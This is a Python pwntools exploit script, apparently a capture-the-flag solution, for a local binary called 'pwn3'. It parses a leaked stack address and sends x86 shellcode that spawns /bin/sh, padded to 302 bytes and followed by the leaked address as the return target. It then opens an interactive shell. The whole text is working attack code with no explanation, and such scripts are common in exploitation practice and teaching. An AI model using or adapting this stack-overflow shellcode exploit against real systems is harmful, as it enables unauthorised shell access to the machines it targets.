from pwn import *

target = process("./pwn3")
target.recvuntil("journey ")
x= int(target.recvuntil("!")[:-1],16)

string_of_bytes = [
    0x31, 0xC0, 0x50, 0x68, 0x2F, 0x2F, 0x73, 0x68,
    0x68, 0x2F, 0x62, 0x69, 0x6E, 0x89, 0xE3, 0x31,
    0xC9, 0x31, 0xD2, 0x83, 0xC0, 0x0B, 0xCD, 0x80
]

# Convert to bytes using to_bytes
shellcode = b''.join(x.to_bytes(1, byteorder='little') for x in string_of_bytes)
payload = shellcode
payload += b"a" * (302 - len(shellcode))
payload += p32(x)
target.sendline(payload)

target.interactive()
